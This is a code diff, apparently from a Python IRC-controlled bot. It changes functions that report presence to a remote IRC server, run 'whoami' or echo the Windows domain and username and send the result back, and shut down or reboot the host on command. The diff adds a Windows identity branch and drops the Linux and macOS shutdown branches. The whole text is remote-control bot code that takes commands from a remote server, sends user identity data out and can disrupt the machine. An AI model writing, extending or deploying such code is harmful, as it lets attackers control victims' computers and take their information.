@@ -102,7 +102,11 @@ def reply(): #send back to IRC server that you are here
 	sendData("Yes I am here")
 
 def whoAmI(): #execute whoami command and send output
-	output  = execute("whoami")
+	if operatingSystem == "windows":
+		output = execute("echo %userdomain%\%username%")
+	else:
+		output  = execute("whoami")
+
 	sendData(output)
 
 def iAmGood(): #send back to IRC server that you are good
@@ -210,10 +214,6 @@ def nap(): #shutdown the computer
 	irc.close()
 	if operatingSystem == "windows": #if windows
 		execute("shutdown -s -t 0")
-	elif operatingSystem == "linux":
-		execute("poweroff")
-	elif operatingSystem == "darwin":
-		execute("shutdown -h now")
 	else:
 		execute("init 0")
 
@@ -221,10 +221,6 @@ def reboot(): #reboot the computer
 	irc.close()
 	if operatingSystem == "windows": #if windows
 		execute("shutdown -r -t 0")
-	elif operatingSystem == "linux":
-		execute("init 6")
-	elif operatingSystem == "darwin":
-		execute ("shutdown -r now")
 	else:
 		execute("init 6")
 
